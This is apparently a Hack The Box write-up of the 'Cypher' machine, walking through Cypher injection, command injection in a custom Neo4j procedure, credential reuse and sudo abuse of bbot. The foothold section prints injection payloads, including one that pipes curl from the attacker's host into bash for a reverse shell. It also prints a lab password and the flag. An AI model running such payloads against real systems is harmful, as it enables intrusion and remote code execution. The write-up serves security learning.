@@ -1,0 +1,130 @@
+Title: Cypher
+Tag: HTB
+Date: 2025-01-01
+
+# Overview
+
+Cypher was a Linux box built around a login page backed directly by a Neo4j graph database, queried with the Cypher query language instead of SQL. The login field is vulnerable to Cypher injection, and a leaked custom Neo4j procedure - meant to check a URL's HTTP status code - shells out to `curl` without sanitizing its input, turning the injection into full OS command execution. From there, a leftover config file leaks Neo4j credentials that are reused as a local user's SSH password, and that user's passwordless sudo access to `bbot` (an OSINT/recon tool that treats its `-t` target argument as a file of scan targets) is abused to make the tool read and echo back the root flag as if it were a target it failed to resolve.
+
+## Recon
+
+```
+> nmap -T4 -p- --min-rate 2000 10.10.11.57
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+> nmap -sC -sV --script vuln -p22,80 10.10.11.57
+22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.8 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    nginx 1.24.0 (Ubuntu)
+```
+
+The vulners script listed a long tail of nginx CVEs, but none of them ended up being the actual path in.
+
+## Web Enumeration
+
+```
+> nano /etc/hosts
+10.10.11.57  cypher.htb
+
+> nikto -h cypher.htb
++ /testing/: Directory indexing found.
++ /login.html: Admin login page/section found.
+
+> dirb http://cypher.htb
++ http://cypher.htb/about
++ http://cypher.htb/api
++ http://cypher.htb/demo
++ http://cypher.htb/login
+==> DIRECTORY: http://cypher.htb/testing/
+```
+
+The page source for `/login` contained a developer comment - `// TODO: don't store user accounts in neo4j` - hinting the login backend queries a Neo4j graph database directly rather than a normal SQL store.
+
+## Foothold Part 1 - Cypher Injection
+
+Submitting a classic SQL-injection-style payload as the username (`' OR 1=1;// --`) into the login form triggered a Neo4j syntax error that leaked the underlying Cypher query verbatim:
+
+```
+neo4j.exceptions.CypherSyntaxError: {code: Neo.ClientError.Statement.SyntaxError}
+"MATCH (u:USER) -[:SECRET]-> (h:SHA1) WHERE u.name = '' OR 1=1;// --' return h.value as hash"
+```
+
+This confirmed the username field is concatenated directly into a Cypher query, i.e. Cypher injection. Reference material on exploiting Neo4j via Cypher injection (https://www.varonis.com/blog/neo4jection-secrets-data-and-cloud-exploits) showed that injected queries can call registered stored procedures, but a first attempt to call a built-in admin procedure failed since it wasn't available on this instance:
+
+```
+neo4j.exceptions.ClientError: {code: Neo.ClientError.Procedure.ProcedureNotFound}
+```
+
+## Foothold Part 2 - Custom Procedure RCE
+
+The `/testing/` directory listing found earlier contained a Neo4j plugin archive with compiled Java classes. Decompiling one of them (`CustomFunctions.java`) revealed a custom stored procedure, `custom.getUrlStatusCode`, that takes a URL and shells out to check its HTTP status:
+
+```java
+String[] command = new String[]{"/bin/sh", "-c",
+    "curl -s -o /dev/null --connect-timeout 1 -w %{http_code} " + url};
+Process process = Runtime.getRuntime().exec(command);
+```
+
+The `url` parameter is concatenated straight into a shell command with no sanitization, so any shell metacharacters in the "URL" are executed as-is. After some trial and error with the correct Cypher call syntax for a registered procedure (`CALL ... YIELD ... RETURN ...`), the injection was refined to call this procedure through the login field:
+
+```
+' OR 1=1 CALL custom.getUrlStatusCode("http://10.10.15.0:7575/test.sh") YIELD statusCode RETURN statusCode; //
+```
+
+A listener on the attacking machine (`python -m http.server 7575`) confirmed the box was reaching out and fetching the file, proving the injection worked end-to-end. Appending a shell command separator to the "URL" turned this into full command execution:
+
+```
+' OR 1=1 CALL custom.getUrlStatusCode("http://10.10.15.0:7575/test.sh; curl http://10.10.15.0:7575/test.sh | bash") YIELD statusCode RETURN statusCode; //
+```
+
+This popped a reverse shell on the box.
+
+## Enumeration and Lateral Movement to graphasm
+
+`/home/graphasm/user.txt` existed but wasn't readable from the initial foothold's account, so lateral movement to `graphasm` was needed. Running linpeas turned up a config file in that user's home directory, `bbot_preset.yml`, containing a plaintext Neo4j credential:
+
+```yaml
+config:
+  modules:
+    neo4j:
+      username: neo4j
+      password: cU4btyib.20xtCMCXkBmerhK
+```
+
+That password was reused as `graphasm`'s own login password:
+
+```
+> ssh graphasm@10.10.11.57
+```
+
+SSH access succeeded, giving the user flag.
+
+## Privilege Escalation - bbot Sudo Abuse
+
+```
+graphasm> sudo -l
+User graphasm may run the following commands on cypher:
+    (ALL) NOPASSWD: /usr/local/bin/bbot
+```
+
+`bbot` is an OSINT/attack-surface recon tool. Another config file in `graphasm`'s home directory, `.config/bbot/secrets.yml`, contained a second (commented-out) Neo4j credential, but it wasn't needed further. `bbot` accepts targets via `-t`, including a file of targets, and processes/echoes each target as part of its scan output regardless of whether the target is a real, resolvable hostname. Since sudo grants root execution of `bbot` with no restriction on arguments, pointing `-t` at the root flag file made `bbot` treat the flag's contents as a "target" and reflect it back in its scan results:
+
+```
+sudo bbot -t /root/root.txt -o /tmp/flag.txt
+cat /tmp/flag.txt/overmedicated_vader/output.txt
+```
+
+```
+[DNS_NAME_UNRESOLVED]   268085b8e147032a0859fd47a9133855   TARGET  (a-error, aaaa-error, cname-error, ...)
+```
+
+The unresolved "DNS name" in the output is the literal content of `/root/root.txt`, giving the root flag without ever needing a direct arbitrary-file-read primitive.
+
+## Takeaways
+
+- Any backend - not just SQL - that builds a query by string concatenation is injectable; Cypher injection against Neo4j follows the same "leak the query via an error message, then abuse it" pattern as classic SQLi.
+- Custom stored procedures/functions added to a database (Neo4j APOC-style plugins included) are ordinary code and can introduce command injection just like any other backend code that shells out based on user input.
+- Publicly reachable directory listings (like `/testing/`) can leak compiled application/plugin code that's worth decompiling - it may expose exactly how a custom API surface behaves internally.
+- Credentials found in one service's config file (here, Neo4j) are worth trying against local OS accounts too - password reuse across a database service and a Linux user account is common on these boxes.
+- A tool that's allowed to run as root via sudo with a user-controlled "target" or "input file" argument can become an arbitrary-file-read primitive if the tool reflects unresolved/invalid input back in its own output, even without any explicit "read file" feature.
